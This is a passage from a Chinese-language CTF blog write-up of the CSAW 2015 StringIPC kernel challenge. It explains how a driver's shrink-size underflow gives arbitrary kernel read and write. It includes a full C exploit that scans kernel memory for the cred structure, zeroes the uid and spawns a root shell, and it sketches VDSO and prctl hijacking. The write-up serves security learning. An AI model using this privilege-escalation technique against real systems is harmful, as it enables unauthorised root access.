<span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>回想之前<a href="https://nicholas-wei.github.io/2022/01/31/kernel-3-UAF/">内核UAF</a>和<a href="https://nicholas-wei.github.io/2022/01/24/kernel-2-stkof/">内核栈溢出</a>中是如何修改cred结构体的。前者是知道了cred大小之后利用指针未清零导致的UAF，后者是直接执行的commit_cred(prepare_cred(0))，但是需要依靠栈溢出覆盖执行流。然而这里不存在溢出，也不会显示返回，也就无法改变执行流。如果这里想要劫持cred结构体，必须知道cred结构体的位置。</p>
+<p>这里给出一种方法：修改task_struct中的char comm[TASK_COMM_LEN]结构。linux中prctl函数中的PR_SET_NAME功能，能够为线程设置16字节以下的名称。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NAME (since Linux <span class="number">2.6</span><span class="number">.9</span>)</span><br><span class="line">    Set the name of the calling thread, using the value in the</span><br><span class="line">    location pointed to <span class="title function_">by</span> <span class="params">(<span class="type">char</span> *)</span> arg2.  The name can be up</span><br><span class="line">    to 16 bytes <span class="type">long</span>, including the terminating null byte.</span><br><span class="line">    <span class="params">(If the length of the <span class="built_in">string</span>, including the terminating</span></span><br><span class="line"><span class="params">     null byte, exceeds <span class="number">16</span> bytes, the <span class="built_in">string</span> is silently</span></span><br><span class="line"><span class="params">     truncated.)</span>  This is the same attribute that can be <span class="built_in">set</span></span><br><span class="line">    via <span class="title function_">pthread_setname_np</span><span class="params">(<span class="number">3</span>)</span> and retrieved using</span><br><span class="line">    <span class="title function_">pthread_getname_np</span><span class="params">(<span class="number">3</span>)</span>.  The attribute is likewise</span><br><span class="line">    accessible via /proc/self/task/[tid]/<span class="title function_">comm</span> <span class="params">(see proc(<span class="number">5</span>))</span>,</span><br><span class="line">	where [tid] is the thread ID of the calling thread, as</span><br><span class="line">    returned by <span class="title function_">gettid</span><span class="params">(<span class="number">2</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来我们只需要知道cred的地址在哪里即可。由于name位置也在线程control block附近，通过在内存中爆破name位置就可以获得cred结构体地址信息了。我们一共需要爆破位于0xffff880000000000~0xffffc80000000000中的64T地址内的数据，相当大的工作量。。。以下脚本中仍有许多地方通过调试也无法知道是为什么。尤其是确定cred结构体位置的地方的判断条件。此外，在找到cred结构体之后，如果想对其写入，只能使用stringIPC提供的一次性写入一字节的方法，而不能一次性写入32字节，也是很迷惑。</p>
+<p>下图为找到的cred结构体位置，我们将下图0x3e8地方改为0即可。</p>
+<p><img src="/.io//image-20220216122608119.png" alt="image-20220216122608119"></p>
+<p>以下为成功改为0时，也就是拿到了ROOT.</p>
+<p><img src="/.io//image-20220216130310607.png" alt="image-20220216130310607"></p>
+<p>此外，自己复现写的脚本似乎很不稳定。不知道为什么有时会找到0x0a地址的地方。需要多尝试几次。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span>       </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> <span class="comment">// for memmem</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>    <span class="comment">/* BSD and Linux */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span> <span class="comment">// for getgid()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span> <span class="comment">// for system(&quot;/bin/sh&quot;)</span></span></span><br><span class="line"><span class="comment">// search string input</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">loff_t</span> index;</span><br><span class="line">    <span class="type">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// create a channel</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open /dev/csaw error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line">    <span class="type">size_t</span> addr = <span class="number">0xffff880000000000</span>;</span><br><span class="line">    <span class="type">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> target_addr;</span><br><span class="line">    <span class="type">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// alloc one</span></span><br><span class="line">    alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    ret = ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line">    <span class="keyword">if</span>(alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad alloc\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] alloc an channel at id %d\n&quot;</span>,alloc_args.id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change its size to get arbitary write</span></span><br><span class="line">    shrink_args.id = alloc_args.id;</span><br><span class="line">    shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>; <span class="comment">// vul, shrink size is `original size - this size` si we get -1 here</span></span><br><span class="line">    ret = ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] now we have arbitary read/write\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use prctl() to set a str</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">&quot;1@mnicholas_Wei&quot;</span>);</span><br><span class="line">    prctl(PR_SET_NAME,buf);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// BEGIN OUR SEARCH</span></span><br><span class="line">    <span class="type">char</span>* local_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// use memmem to search for pattern</span></span><br><span class="line">        <span class="comment">// we can&#x27;t do memmem directly, because we need to search it inside</span></span><br><span class="line">        <span class="comment">// the space of **device**, not the space of our program.</span></span><br><span class="line">        <span class="comment">// printf(&quot;look for addr 0x%lx\n&quot;,addr);</span></span><br><span class="line">        seek_args.id = alloc_args.id;</span><br><span class="line">        seek_args.index = addr<span class="number">-0x10</span>; <span class="comment">// index is actually the begin of the place we want to search.</span></span><br><span class="line">        seek_args.whence = SEEK_SET; <span class="comment">// search from begin</span></span><br><span class="line">        ret = ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">        <span class="comment">// use channel_read to read channel&#x27;s space</span></span><br><span class="line">        read_args.buf = local_buf;</span><br><span class="line">        read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">        read_args.id = alloc_args.id;</span><br><span class="line">        ret = ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line">        <span class="comment">//now data is in local_buf</span></span><br><span class="line">        ret = memmem(local_buf,<span class="number">0x1000</span>,buf,<span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] user-level pointer @ 0x%lx\n&quot;</span>,ret);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find pattern @ 0x%lx\n&quot;</span>,ret+addr);</span><br><span class="line">            cred = *(<span class="type">size_t</span> *)(ret - <span class="number">0x8</span>);</span><br><span class="line">            real_cred = *(<span class="type">size_t</span> *)(ret - <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span>((cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred)) <span class="comment">// what&#x27;s the meaning of this?</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// target_addr = addr+ret-(int)buf;// what&#x27;s meaning?</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] find cred @ 0x%lx\n&quot;</span>,cred);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] find real_cred @ 0x%lx\n&quot;</span>, real_cred);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now we get the cred addr, we can overwrite it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// The following way doesn&#x27;t work</span></span><br><span class="line">    <span class="comment">// //1. seek</span></span><br><span class="line">    <span class="comment">// seek_args.id = alloc_args.id;</span></span><br><span class="line">    <span class="comment">// seek_args.index = cred + 8 - 0x10;</span></span><br><span class="line">    <span class="comment">// printf(&quot;[+] switch to search @ %llx\n&quot;,seek_args.index);</span></span><br><span class="line">    <span class="comment">// seek_args.whence = 0;//from begin</span></span><br><span class="line">    <span class="comment">// ret = ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span></span><br><span class="line">    <span class="comment">// // 2.write</span></span><br><span class="line">    <span class="comment">// char payload[32] = &#123;0&#125;;</span></span><br><span class="line">    <span class="comment">// write_args.buf = payload;</span></span><br><span class="line">    <span class="comment">// write_args.count = 32;</span></span><br><span class="line">    <span class="comment">// write_args.id = alloc_args.id;</span></span><br><span class="line">    <span class="comment">// ret = ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// the solution on website, works well</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] switch to search @ %llx\n&quot;</span>,cred<span class="number">-0x10</span> +<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;<span class="number">44</span>;i++)&#123;</span><br><span class="line">        seek_args.id =  alloc_args.id;</span><br><span class="line">        seek_args.index = cred<span class="number">-0x10</span> +<span class="number">4</span> + i ;</span><br><span class="line">        seek_args.whence= SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">        root_cred[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        write_args.id = alloc_args.id;</span><br><span class="line">        write_args.buf = (<span class="type">char</span> *)root_cred;</span><br><span class="line">        write_args.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);   </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ROOTED!\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Something wrong...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="方法二：劫持VDSO"><a href="#方法二：劫持VDSO" class="headerlink" title="方法二：劫持VDSO"></a>方法二：劫持VDSO</h2><p>VDSO在pwn中有所耳闻。VDSO是一种ELF文件，当进程被加载时，主要是将一些安全上不太重要，但是时间要求很高的内核函数提出来放在VDSO，并一并映射到用户地址空间中。这样用户线程可以直接调用此类函数而不必有陷入内核的开销。以下内容为<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/vdso.7.html">man vsdo</a>包含了x86_64下的vdso函数。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x86-64 functions</span><br><span class="line">       The table below lists the symbols exported by the vDSO.  All of</span><br><span class="line">       these symbols are also available without the &quot;__vdso_&quot; prefix,</span><br><span class="line">       but you should ignore those and stick to the names below.</span><br><span class="line"></span><br><span class="line">       symbol                 version</span><br><span class="line">       ─────────────────────────────────</span><br><span class="line">       __vdso_clock_gettime   LINUX_2.6</span><br><span class="line">       __vdso_getcpu          LINUX_2.6</span><br><span class="line">       __vdso_gettimeofday    LINUX_2.6</span><br><span class="line">       __vdso_time            LINUX_2.6</span><br></pre></td></tr></table></figure>
+
+<p>基本想法是：由于VDSO时可执行的段，思考能否利用全局写来给VDSO某个函数写上shellcode(例如gettimeofday)然后想办法触发此函数。但是要注意我们只能等待内核态进程触发此函数。个人觉得这种方法比较牵强，等待root进程调用不太现实(虽然也不失为一种攻击可能性)。</p>
+<p>exp主要参考<a target="_blank" rel="noopener" href="http://p4nda.top/2018/11/07/stringipc/#%E5%85%B3%E4%BA%8EVDSO">p4nda师傅</a>，写的很好了。我没有什么创新点就不复制了。思路和之前的差不多，全局搜索找到gettimeofday的地址，覆写指令部分为一段shellcode。由于是驱动级别写，不会触发用户的不可写错误。</p>
+<h2 id="方法三：劫持prctl"><a href="#方法三：劫持prctl" class="headerlink" title="方法三：劫持prctl"></a>方法三：劫持prctl</h2><p>这其实是想通过本题学到的方法。</p>
+<p>prctl全名应该是process control(我猜的)<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/prctl.2.html">官方文档在这里</a>，主要定义了一些对于线程和进程的操作。但是看解法也太复杂了。。后面再次复现的时候补上，原理过于复杂了</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://ypl.coffee/csaw-2015-stringipc/">https://ypl.coffee/csaw-2015-stringipc/</a></p>
+<p><a target="_blank" rel="noopener" href="http://p4nda.top/WooyunDrops/#!/drops/1059.%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E6%9C%89%E6%95%88%E7%9A%84mmap%E4%B8%8Eremap_pfn_range">http://p4nda.top/WooyunDrops/#!/drops/1059.%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E6%9C%89%E6%95%88%E7%9A%84mmap%E4%B8%8Eremap_pfn_range</a></p>
+<p><a target="_blank" rel="noopener" href="http://p4nda.top/2018/11/07/stringipc/#%E5%85%B3%E4%BA%8EVDSO">http://p4nda.top/2018/11/07/stringipc/#%E5%85%B3%E4%BA%8EVDSO</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-02-15, 16:26:49</p>
+        <p><span>最后更新:</span>2022-02-16, 14:32:02</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/02/15/kernel-5-bypass-smep1/" title="kernel-5-bypass_smep1">https://nicholas-wei.github.io/2022/02/15/kernel-5-bypass-smep1/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/02/15/kernel-5-bypass-smep1/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/02/23/fastbin-reverse-into-tcache/">
+                    fastbin-reverse-into-tcache
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/02/14/pwnable-babystack/">
+                    pwnable-babystack
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.</span> <span class="toc-text">检查保护</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">分析代码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#open%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">open函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#release%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">release函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ioctl"><span class="toc-number">2.3.</span> <span class="toc-text">ioctl</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#attack"><span class="toc-number">4.</span> <span class="toc-text">attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8A%AB%E6%8C%81cred%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">4.1.</span> <span class="toc-text">方法一：劫持cred结构体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%8A%AB%E6%8C%81VDSO"><span class="toc-number">4.3.</span> <span class="toc-text">方法二：劫持VDSO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%8A%AB%E6%8C%81prctl"><span class="toc-number">4.4.</span> <span class="toc-text">方法三：劫持prctl</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 